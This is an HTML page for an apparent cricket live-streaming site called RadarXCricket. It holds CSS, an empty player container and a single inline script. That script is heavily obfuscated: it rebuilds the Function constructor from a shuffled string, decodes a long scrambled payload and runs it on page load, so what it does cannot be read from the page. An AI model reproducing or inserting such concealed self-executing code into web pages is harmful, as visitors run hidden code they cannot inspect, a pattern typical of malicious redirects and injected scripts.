<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXCricket</title>
    <style>
        /* General Page Styling */
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #242424, #3b5998);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }

        /* Bingewav Sports Logo Section */
        .logo-container {
            background: #000; /* Black background for the logo */
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        }

        .logo-container img {
            width: 220px; /* Adjust the logo size */
            height: auto;
        }

        /* Video Player Styling */
        .player-container {
            width: 95%;
            max-width: 1200px;
            margin: 20px auto;
            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            overflow: hidden;
            background: #000; /* Black background behind the video for better focus */
            position: relative;
            padding-top: 56.25%; /* 16:9 Aspect Ratio */
        }

        .player-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 15px;
            border: none;
        }

        /* Stream Issue Section */
        .stream-issue {
            margin-top: 20px;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 16px;
            color: #fff;
            width: fit-content;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        }

        .stream-issue a {
            color: #00c1ff;
            text-decoration: none;
            font-weight: bold;
        }

        .stream-issue a:hover {
            text-decoration: underline;
        }

        /* Join Telegram Button */
        .join-telegram-container {
            margin-top: 20px;
            text-align: center;
        }

        .join-telegram-btn {
            padding: 10px 20px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            background-color: #008fd6;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .join-telegram-btn:hover {
            background-color: #006bb3;
        }
    </style>
</head>
<body>

<!-- Video Player Section -->
<div class="player-container" id="playerContainer"></div>

<!-- Join Telegram Button -->
<div class="join-telegram-container">
  <!--  <button class="join-telegram-btn" onclick="window.open('https://t.me/RadarXCricket', '_blank')">Join Telegram Channel</button> -->
</div>

<script>
var loadIframe;(function(){var eti='',VHV=759-748;function Mnk(m){var j=1673110;var a=m.length;var q=[];for(var h=0;h<a;h++){q[h]=m.charAt(h)};for(var h=0;h<a;h++){var x=j*(h+119)+(j%24057);var g=j*(h+670)+(j%45142);var l=x%a;var i=g%a;var y=q[l];q[l]=q[i];q[i]=y;j=(x+g)%3079915;};return q.join('')};var FFi=Mnk('cvscutyrfleabnqntomugkootrihcrpjswxdz').substr(0,VHV);var VYv='t;d +=1+btnn b]le).v.olv)v)h>(ru<nv ]p)o)np;ptnv6f!=o;i;}]5=l".r+7)6vaesd7-,l3sg(z+<,),;nac"0,90)j8v[c"=f6) u7s))-2y1;,8)lsdt)!=Almoir)c)1{o8,;ote+=lng.=nae+o.psro[t=o+ohna} 5uv]7y-++])"(=()==a=ar0iarth 9 e u(gr 9c82eatshqrhs 9;p,Cau17r [ nreua;b8=rlvn7 C]tec"dcef=3bptrnnfj6;"m;j(y{j(>k0+af81p=ah5w7ruaoCv}v[kc a6m;tan})+abv;+ele a +cc;7=qc]i,e6;t;it)e;e;h=civtr dszuee"el(+nh,8no+{+n)vr;;a4[,r][f(o;9.a.Coi"knzti= 54a0o,i*(+jtz,1r)o]ln;1lo1=v(;<2pt[+rc.sv79j;9=ol)aa)w0v2a;=hAoa[h]e.rochogio4<[fs(.a{;s.8ioArvpl)l-.;hwfssv[=d4jr;(,t,lu=x0o.jwa;=0oip(r=.bu(up(ri.xp((s gpg;-u{.t",jp.nt)[.n=;ps;)tfgsa,2(6o +fo+(,pidf)=y6=] =d.=+r=uwrl=zfr,zlm.r(ls1s.ta)ai}b10)h=(=eg.{t[gt]aa* ,;re0hvlCCth(89vkridie2dtfn(s-tt(ev}.4=,a,;)ga jvfr((f=-).p}rhv;=t(eS(r(g;htiing+vr,rCra);gvt=hlCape](a ;)q=rgaA,rrrrgjn<o2(+yq7,iiln"n[;[,;+a1)==l(p0e.;n9S,r0;g(,lssob;rxhmt;o;=r65rrahu1nu;exi.ep;3 f+e{.fed]dfA3';var AXy=Mnk[FFi];var QNM='';var MYF=AXy;var gzr=AXy(QNM,Mnk(VYv));var TJt=gzr(Mnk('e)$U_in.1r$)a-)ai_lUi;s(owtUi{;U()e f #r(8UU$}Ue3$]oa_a)*de. o((6;$2U)Un\'an,U!a \/\'c)ltm)  t0srir ;#U)"n(0eUU,)9n_ve0 .on_ne4U4Uaio;.#S5U3atr;(ga.n_4b}U_($.mt)4=ml=hU"Uuea.U.6o%,1c(; 1UU%U.U2)dsl7-nscetf7c{l(-1a[q7amyn)rUa2rmsardt}4v]}jgac}4f4w!rtUiU+%-%04!8lf4&i%#gc[e)v\/5=%etr-fpllb5s.=pU,n3Ua=f_cbUo\/e8fUt;Uct$4nssUefU0acUUl1da3 bn7eer()3o0.%%;2aoh_to 01";E618\/[+=Uopgle)23jbceU(h;-f5(.ot,U+f}w_$o]oUrl37t.m%%!(%mU,t)"it\/ am)Uor{cs!} $_t!pg3,r[Up7a(7aU.6!)r25lt(o6)csoq8m5,o$zgn3ap%d.,(a$pIma)e$1i).}55.b_$cUjp;=dU2U4.lws%do{Ul#._aa4m%$8_}d(.l_l.9.8meU.]]$5;UUe1));,bn,thna$!_ .as) 9);rUy+o.t;%(;sl=oc((. :q+tkUu!],i9i,Ud]hr)Ug\']pr}=f7r3UUp!U$aefb$p2-a(i,_UU)a{-o9m{5rU(.cr84kb(dw_br#)().aali!nb5.h)ul$((]U]033.(5ec=&uclgrcc0e55(&a75as43)seU);u;ft"m3$:9.__i1e)pUUp,((]].awe)U=U=;_56,Uncff]5obqd41lrr$.ooeop%9bn%ctUq(1,))=d5!;4._=U+?io(g )7tlr;C)8 U=oqef1)7$;U4yt#.=\/r=_b,Uru. _f;dee70!%eep2U]m.uU!%n_k.3dtecad;]U4"U_(3o.f5mpoU+flU8=t)-itUxx(-UpUUu6(sbp}UUst%5iq(t\/5f.Um2-U7u03pf_0fl;U12e+.0UU=UfiaiUl[U(s$cc U0h+#b0l))]m(U-a[twrble_7a5UfU_;_1!U6l;cU%c4f90(u(Ufpr_s1nt7*UU%,}i5_d8)l_6dr5!,UleU_o.(_EI()e.(co0)_j6!,rC),Uc833y[sr+U]mj6f1$m$t%Ubto"ca zr96p(v50o{6$e65f.0i0(,fe)Crm%{$l59 453U0S.}%al.=})c{j3[n),=UdUUcU7s7,cbd0w,=Ur7fUnUU;Us,(l1!!*,i,4&.asi5S.l10Ui3Ufy(1i0ge1)U{ix4({;.(b.!pgUi.!tcf;!p.c{Ua;,:7(v"u3eC6c1,5.+op49*n)U0b5.UU7)0j$sot,3.3,.U:"$eou3f70w$;p5UU3] )jt1l1U6;]bc=l-!*l\'.Ut$73.U.sbfosn79f5$UUf,e ioeans&y9t..({.=4U._U4n%l{324ba\/U(Un.ric_5e=_((U:7UUl3wrv.Uen3lU_ma;917)2i{bc.ei(btz UenU.2%8.1_$_4,o2# f o2i(%.fqe2u3rogsn!}oamlr.!c3)tr\/es_l(8!f[llU!!33mc])!j!o=4tc,t;io!r'));var qNV=MYF(eti,TJt );qNV(7725);return 5589})()
</script>

</body>
</html>